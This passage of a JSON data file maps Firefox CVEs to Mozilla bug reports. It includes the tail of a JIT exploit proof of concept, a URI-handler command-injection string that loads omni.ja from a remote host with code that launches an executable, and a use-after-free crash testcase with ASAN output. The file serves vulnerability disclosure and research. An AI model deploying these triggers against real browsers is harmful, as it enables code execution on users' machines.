trigger(magic); } function pwn() { const v1 = \"adsf\"; const v3 = \"not_asdf\"; for (let v7 = 0; v7 < 2; v7++) { function v8() { let v13 = 0; do { v13++; } while (v13 < 1200000); // If the previous loop runs long enough, IonMonkey will JIT compile v8 and enter the // JITed code via OSR. This will leave the hitCount for the loop exit in the interpreter // at 0 (because the exit is taken in JITed code). This in turn will lead to IonMonkey // pruning the loop exit when compiling pwn() (with inlined v8), as its heuristics // suggest that the branch is never taken (hitCount == 0 and a few more). This will then // lead to the incorrect removal of Phi nodes, and ultimately the leaking of a // JS_OPTMIZED_OUT magic value to the baseline JIT, where it is observable for the // current script. } const v15 = v8(); for (let v25 = 0; v25 < 100000; v25++) { // Should never be taken, but will be after triggering the bug (because both v3 and v1 // will be a JS_OPTIMIZED_OUT magic value). if (v3 === v1) { let magic = v3; console.log(\"Magic is happening!\"); hax(magic); return; } if (v1) { } else { const v26 = {get:v8}; for (let v30 = 0; v30 < 1000; v30++) { } } } } } pwn(); Please note: this bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made broadly available (whichever is earlier), the bug report will become visible to the public. With any fix, please give credit for identifying the vulnerability to Samuel Groß of Google Project Zero."
      }
    ],
    "CVE-2019-9793": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1528829",
        "title": "Arbitrary range mis-inference due to loop phi range analysis disregarding overflows/truncation",
        "description": "The bug exists in the current release and mozilla-central branches of the Spidermonkey engine included in Firefox. It exists on all platforms. The issue lets an attacker produce an arbitrary value in compiled JavaScript code, for which the range analysis will infer a fully controlled, incorrect range. For a detailed analysis of the issue and its exploitability, along with reproducing code samples, please refer to the attached writeup.md file."
      }
    ],
    "CVE-2019-9794": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1530103",
        "title": "URI handler Remote Code Execution via command line parameter injection in Firefox",
        "description": "Tested on Microsoft Windows 10 Enterprise version 10.0.17134 Build 17134 Using Firefox Quantum version 65.0.1 (64-bit) Steps to reproduce: Close all running instances of firefox Open the run prompt (windows key + r) and run the following URL: https://www.tsscyber.com.au#\" -greomni \"\\\\remoteHost\\omni.ja\" -appomni \"\\\\remoteHost\\omni2.ja Expected Result: Firefox ignores the command as additional command line arguments are present. Actual Result: Firefox accepts the command and attempts to retrieve ‘omni.ja’ and ‘omni2.ja’ from ‘remoteHost’. As ‘remoteHost’ likely doesn’t resolve to an IP, firefox crashes and ‘crashreporter.exe’ is run. Detailed Information: A malicious user can craft URIs in third party applications (tested using MS Outlook and MS Office) that can result in Remote Code Execution when Firefox is installed and configured as the default URI handler for a given URI scheme (e.g. http/https). The ‘greomni’ and ‘appomni’ command line arguments are accepted via the URI handler command. These flags are used to specify the location of the ‘omni.ja’ file. An attacker can specify a network location for the ‘greomni’ and ‘appomni’ arguments to force Firefox to load malicious ‘omni.ja’ files. Some information about the 'omni.ja' files can be found here: https://developer.mozilla.org/en-US/docs/Mozilla/About_omni.ja_(formerly_omni.jar) The shell command for HTTP URI’s is specified in the windows registry in an entry similar to: Computer\\HKEY_CLASSES_ROOT\\FirefoxHTML-308046B0AF4A39CB\\shell\\open\\command The value is: \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -osint -url \"%1\" When the example malicious URL above is clicked, the command becomes: \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -osint -url \"https://www.tsscyber.com.au#\" -greomni \"\\\\remoteHost\\omni.ja\" -appomni \"\\\\remoteHost\\omni2.ja\" This issue can be exploited from Outlook and Office because they don’t URL Encode the hash segment of a URL making it possible to inject double quotes into the command. There are likely other programs that have similar behaviours. The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected via a malicious URL. The ‘osint’ flag was introduced in 2007 in response to the following bug: https://bugzilla.mozilla.org/show_bug.cgi?id=384384 I think that the issue occurs because the ‘greomni’ and ‘appomni’ command line arguments are used to retrieve the omni.ja files before the ‘osint’ flag is checked. The ‘greomni’ and ‘appomni’ arguments are then hidden from the ‘osint’ check because argc’s value is reduced by two. This means that when the ‘osint’ check is performed later, the value of argc matches the acceptable amount of command line arguments the ‘osint’ flag expects. This is the area of code that I think is causing the issue: https://dxr.mozilla.org/mozilla-central/source/js/xpconnect/src/XPCShellImpl.cpp#1267 I believe this is where the ‘osint’ flag is being checked: https://dxr.mozilla.org/mozilla-central/source/browser/components/nsBrowserContentHandler.js#648 RCE is achieved by introducing malicious code into the contents of files in the omni.ja archives. We have had limited success launching arbitrary executables by injecting the following code into .js and .jws files (for example C:\\Program Files (x86)\\Mozilla Firefox\\browser\\omni.ja’s /chrome/browser/content/browser/browser.js file). Components.utils.import(\"resource://gre/modules/Subprocess.jsm\") let opt = { command: \"C:\\windows\\system32\\calc.exe\", arguments: [], workdir: \"C:\\windows\\system32\", stderr: \"pipe\"}; let x = Subprocess.call(opt); Credit: Joshua Graham of TSS & Brendan Scarvell"
      }
    ],
    "CVE-2019-9796": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1531277",
        "title": "heap-use-after-free in nsRefreshDriver::Tick (mozilla::SMILAnimationController)",
        "description": "The following testcase crashes the latest ASAN build of Firefox 67.0a1 (SourceStamp=198cd4a81bf2afa7cc79360f90da7bc91218b76d). It usually takes about 30 seconds to trigger. crash.html <script> function start() { o13=document.documentElement; o209=document.createElement('div'); o209.innerHTML='<svg><audio>'; o211=o209.firstChild.getElementsByTagName('*')[0]; o234=document.createElement('div'); o234.innerHTML='<svg><title>'; o241=o234.firstChild.getElementsByTagName('*')[0]; o257=document.createElement('div'); o257.innerHTML='<svg><font-face>'; o272=o257.firstChild.getElementsByTagName('*')[0]; o392=window.document; o392.write('<html><body></body></html>'); o409=o392.head; o611=o392.createElement('style'); o409.appendChild(o611); o611.textContent=':first-line{'; o764=o241.ownerDocument; o765=o764.head; o771=document.createElement('style'); o846=document.createElementNS('http://www.w3.org/2000/svg','animate'); o13.appendChild(o846); o898=o272.ownerDocument; o898.close(); o898.write('<html><body></body></html>'); o1109=document.createElement('div'); o1109.innerHTML='<svg>'; o898.close(); o1121=o771.contentEditable=true; o1252=document.createElement('iframe'); window.top.document.body.appendChild(o1252); o1387=document.documentElement; try{o898.appendChild(o898.replaceChild(o898.documentElement,o898.documentElement));}catch(e){} o1443=o1252.contentDocument; o1444=o1443.write(unescape('%0d')); o1443.appendChild(o13); o1387.appendChild(o211); o211.appendChild(o765); o13.appendChild(o771); o13.appendChild(o1109); window.top.setTimeout(fun0,4); } function fun0() { o898.appendChild(o1443.replaceChild(o898.documentElement,o1443.documentElement)); for(var x=0;x<1444;x++)eval(\"delete o\" + x); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==26274==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110001eecc0 at pc 0x7f048f5cb63b bp 0x7ffde4ccbc30 sp 0x7ffde4ccbc28 READ of size 8 at 0x6110001eecc0 thread T0 (file:// Content) #0 0x7f048f5cb63a in AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:44:39 #1 0x7f048f5cb63a in AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:361 #2 0x7f048f5cb63a in RefPtr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:104 #3 0x7f048f5cb63a in nsRefreshDriver::Tick(mozilla::layers::BaseTransactionId<mozilla::VsyncIdType>, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1849 #4 0x7f048f5dc0f9 in TickDriver /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:342:13 #5 0x7f048f5dc0f9 in mozilla::RefreshDriverTimer::TickRefreshDrivers(mozilla::layers::BaseTransactionId<mozilla::VsyncIdType>, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:319 #6 0x7f048f5db9e8 in mozilla::RefreshDriverTimer::Tick(mozilla::layers::BaseTransactionId<mozilla::VsyncIdType>, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:336:5 #7 0x7f048f5dfc2f in RunRefreshDrivers /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:772:5 #8 0x7f048f5dfc2f in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::layers::BaseTransactionId<mozilla::VsyncIdType>, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:692 #9 0x7f048f5dedea in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::VsyncEvent const&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:592:9 #10 0x7f04900c8925 in mozilla::layout::VsyncChild::RecvNotify(mozilla::VsyncEvent const&) /builds/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:65:16 #11 0x7f04867fd17b in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:168:54 #12 0x7f04863c6477 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:2808:28 #13 0x7f0485bee789 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2150:21 #14 0x7f0485bea58a in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2077:9 #15 0x7f0485bec791 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1936:3 #16 0x7f0485bed557 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1967:13 #17 0x7f048495e1d6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1162:14 #18 0x7f048496607d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:474:10 #19 0x7f0485bf7b8f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #20 0x7f0485adfe6e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #21 0x7f0485adfe6e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #22 0x7f0485adfe6e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #23 0x7f048eee6473 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #24 0x7f0493a86b2e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:908:20 #25 0x7f0485adfe6e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #26 0x7f0485adfe6e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #27 0x7f0485adfe6e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #28 0x7f0493a85c83 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:746:34 #29 0x555a37a7e874 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:49:28 #30 0x555a37a7e874 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:265 #31 0x7f04a8a80b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #32 0x555a379a3efc in _start (/home/nils/browser/firefox/firefox/firefox+0x2defc) 0x6110001eecc0 is located 64 bytes inside of 200-byte region [0x6110001eec80,0x6110001eed48) freed by thread T0 (file:// Content) here: #0 0x555a37a4ba22 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7f048e666315 in mozilla::SMILAnimationController::Release() /builds/worker/workspace/build/src/dom/smil/SMILAnimationController.cpp:109:1 #2 0x7f0488c2efb1 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:45:40 #3 0x7f0488c2efb1 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:362 #4 0x7f0488c2efb1 in ~RefPtr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:76 #5 0x7f0488c2efb1 in mozilla::dom::Document::~Document() /builds/worker/workspace/build/src/dom/base/Document.cpp:1593 #6 0x7f048ce27929 in ~nsHTMLDocument /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:186:36 #7 0x7f048ce27929 in nsHTMLDocument::~nsHTMLDocument() /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:186 #8 0x7f0484751cd8 in MaybeKillObject /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2428:29 #9 0x7f0484751cd8 in SnowWhiteKiller::Visit(nsPurpleBuffer&, nsPurpleBufferEntry*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2457 #10 0x7f0484726035 in void nsPurpleBuffer::VisitEntries<SnowWhiteKiller>(SnowWhiteKiller&) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:941:23 #11 0x7f0484727818 in nsCycleCollector::FreeSnowWhiteWithBudget(js::SliceBudget&) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2622:14 #12 0x7f0486d62759 in AsyncFreeSnowWhite::Run() /builds/worker/workspace/build/src/js/xpconnect/src/XPCJSRuntime.cpp:142:9 #13 0x7f0484981e72 in IdleRunnableWrapper::Run() /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:319:22 #14 0x7f048495e1d6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1162:14 #15 0x7f048496607d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:474:10 #16 0x7f0485bf7b8f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #17 0x7f0485adfe6e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #18 0x7f0485adfe6e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #19 0x7f0485adfe6e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #20 0x7f048eee6473 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #21 0x7f0493a86b2e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:908:20 #22 0x7f0485adfe6e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #23 0x7f0485adfe6e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #24 0x7f0485adfe6e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #25 0x7f0493a85c83 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:746:34 #26 0x555a37a7e874 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:49:28 #27 0x555a37a7e874 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:265 #28 0x7f04a8a80b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 previously allocated by thread T0 (file:// Content) here: #0 0x555a37a4bda3 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x555a37a8063d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7f0488c8b3da in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7f0488c8b3da in mozilla::dom::Document::GetAnimationController() /builds/worker/workspace/build/src/dom/base/Document.cpp:6102 #4 0x7f048df03ea2 in mozilla::dom::SVGAnimationElement::BindToTree(mozilla::dom::Document*, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/svg/SVGAnimationElement.cpp:147:48 #5 0x7f0488d00491 in mozilla::dom::Element::BindToTree(mozilla::dom::Document*, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/base/Element.cpp:1743:17 #6 0x7f048cdf7417 in nsGenericHTMLElement::BindToTree(mozilla::dom::Document*, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/html/nsGenericHTMLElement.cpp:423:33 #7 0x7f048cd6f9b3 in mozilla::dom::HTMLSharedElement::BindToTree(mozilla::dom::Document*, nsIContent*, nsIContent*) /builds/worker/workspace/build/src/dom/html/HTMLSharedElement.cpp:236:29 #8 0x7f0489021209 in nsINode::InsertChildBefore(nsIContent*, nsIContent*, bool) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1269:23 #9 0x7f048902cec7 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:2389:14 #10 0x7f0489c65ba9 in InsertBefore /builds/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:1684:12 #11 0x7f0489c65ba9 in AppendChild /builds/worker/workspace/build/src/obj-firefox/dist/include/nsINode.h:1687 #12 0x7f0489c65ba9 in mozilla::dom::Node_Binding::appendChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/NodeBinding.cpp:1021 #13 0x7f048c09fd38 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3144:13 #14 0x7f0493d67b97 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:440:13 #15 0x7f0493d67b97 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:532 #16 0x7f0493d6a152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:603:8 #17 0x7f0494a227b1 in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #18 0x7f04949db671 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:238:19 #19 0x7f0494a00f50 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:501:19 #20 0x7f0493d68be9 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:14 #21 0x7f0493d4f9df in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:591:10 #22 0x7f0493d4f9df in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3051 #23 0x7f0493d32738 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:420:10 #24 0x7f0493d68506 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:560:13 #25 0x7f0493d6a152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:603:8 #26 0x7f049494b016 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2623:10 #27 0x7f048b6a9d29 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:266:37 #28 0x7f048c952e69 in void mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JS::Realm*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #29 0x7f048c9500f9 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:205:12 #30 0x7f048c902f3a in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1042:51 #31 0x7f048c905513 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1237:17 #32 0x7f048c8e56b0 in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:350:5 #33 0x7f048c8e56b0 in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:351 #34 0x7f048c8e38d8 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:553:16 #35 0x7f048c8ea523 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1044:11 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:44:39 in AddRef Shadow bytes around the buggy address: 0x0c2280035d40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280035d50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280035d60: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c2280035d70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280035d80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa =>0x0c2280035d90: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd 0x0c2280035da0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c2280035db0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c2280035dc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2280035dd0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa 0x0c2280035de0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==26274==ABORTING"
      }
    ],
    "CVE-2019-9799": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1505678",
        "title": "ExternalHelperAppParent doesn't validate arguments (potential sandbox issue)",
        "description": "I've been looking for variants of bug 1438425, using static analysis to find similar cases.I wrote Semmle query for parent IPDL handlers which take an nsCString parameter called \"data\". Mostly these related to remoting various nsiStreamListeners. Overall the architecture concerns me: there seems to be a lot of parameters passed back and forth between parent and child, and there are a lot of paramters which are just taken at face value in the parent. BUT I haven't found a concrete issue yet, so I'm filing this to get other opinions. Take ExternalHelperAppParent::RecvOnDataAvailable[1] as an example. It receives `nsCString& data`, and also an offset and count from the child. These are passed into: DebugOnly<nsresult> rv = NS_NewByteInputStream(getter_AddRefs(stringStream), data.get(), count, NS_ASSIGNMENT_DEPEND); It's hard to trace, but as far as I can tell, these values end up in nsExternalAppHandler::OnDataAvailable [2], where the stream is written to a temporary file. Now this on it's own isn't too serious - you can maybe stream a bunch of memory into a file. But thats a guess, and if you can then read the file, then we have at least an info leak. My more general question is: \"is it safe to pass untrusted length values to NS_NewByteInputStream. If the answer is no, then there are half a dozen other places that we need to add checks (Recv*DataAvailable mostly). And I assume the fix here is just to check that the count < data.length() [1] https://searchfox.org/mozilla-central/rev/6e0e603f4852b8e571e5b8ae133e772b18b6016e/uriloader/exthandler/ExternalHelperAppParent.cpp#156 [2] https://searchfox.org/mozilla-central/rev/6e0e603f4852b8e571e5b8ae133e772b18b6016e/uriloader/exthandler/nsExternalHelperAppService.cpp#1939 [3] https://searchfox.org/mozilla-central/search?q=Recv.*dataAvailable&case=false&regexp=true&path=parent"
      }
    ],
    "CVE-2019-9800": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1540166%2C1534593%2C1546327%2C1540136%2C1538736%2C1538042%2C1535612%2C1499719%2C1499108%2C1538619%2C1535194%2C1516325%2C1542324%2C1542097%2C1532465%2C1533554%2C1541580",
        "description": "I've been looking for variants of bug 1438425, using static analysis to find similar cases.I wrote Semmle query for parent IPDL handlers which take an nsCString parameter called \"data\". Mostly these related to remoting various nsiStreamListeners. Overall the architecture concerns me: there seems to be a lot of parameters passed back and forth between parent and child, and there are a lot of paramters which are just taken at face value in the parent. BUT I haven't found a concrete issue yet, so I'm filing this to get other opinions. Take ExternalHelperAppParent::RecvOnDataAvailable[1] as an example. It receives `nsCString& data`, and also an offset and count from the child. These are passed into: DebugOnly<nsresult> rv = NS_NewByteInputStream(getter_AddRefs(stringStream), data.get(), count, NS_ASSIGNMENT_DEPEND); It's hard to trace, but as far as I can tell, these values end up in nsExternalAppHandler::OnDataAvailable [2], where the stream is written to a temporary file. Now this on it's own isn't too serious - you can maybe stream a bunch of memory into a file. But thats a guess, and if you can then read the file, then we have at least an info leak. My more general question is: \"is it safe to pass untrusted length values to NS_NewByteInputStream. If the answer is no, then there are half a dozen other places that we need to add checks (Recv*DataAvailable mostly). And I assume the fix here is just to check that the count < data.length() [1] https://searchfox.org/mozilla-central/rev/6e0e603f4852b8e571e5b8ae133e772b18b6016e/uriloader/exthandler/ExternalHelperAppParent.cpp#156 [2] https://searchfox.org/mozilla-central/rev/6e0e603f4852b8e571e5b8ae133e772b18b6016e/uriloader/exthandler/nsExternalHelperAppService.cpp#1939 [3] https://searchfox.org/mozilla-central/search?q=Recv.*dataAvailable&case=false&regexp=true&path=parent"
      }
    ],
    "CVE-2019-9801": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1527717",
        "title": "Windows programs that aren't \"URL Handlers\" exposed to web content",
        "description": "On Windows Firefox will accept any registered ProgID as an external protocol scheme and offer to launch the local application if given such a URL. Unless a program has specifically advertised itself as a \"URL Handler\" (and presumably addressed the security implications of remote untrusted content) we should NOT offer to launch them. For an example see https://crbug.com/889459 where a python.file: URL was used as a key part of a remote execution bug (with user interaction). IE/Edge, meanwhile, safely ignore python.file: (and a zillion others) because they're checking for the presence of the URL Handler key. We'd want to do a similar check probably in https://searchfox.org/mozilla-central/source/uriloader/exthandler/win/nsOSHelperAppService.cpp#72"
      }
    ],
    "CVE-2019-9802": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1415508",
        "title": "FTPChannelParent::RecvDivertOnDataAvailable - Chrome Process Info Leak",
        "description": "As part of a code review I am conducting for Paul Theriault against the sandbox, the following vulnerability has been discovered. A compromised content process can initiate an FTP file download which will in turn generate a mozilla::net::PFTPChannelChild object to handle downloading the files contents for rendering in the content process. If the MIME type is not supported for rendering in the content process, the file will be passed over to the Chrome process so the user may elect to either open or download the file. When the file is to be passed over to the Chrome process, the child content process will call FTPChannelParent::RecvDivertOnDataAvailable in the parent chrome process via the PFTPChannel IPDL protocol. The child may supply a length value which is greater than the total size of the file to be downloaded via the 'count' parameter. > mozilla::ipc::IPCResult > FTPChannelParent::RecvDivertOnDataAvailable(const nsCString& data, // <-- a byte buffer holding the files contents. > const uint64_t& offset, > const uint32_t& count) // <-- attacker can supply a count value greater 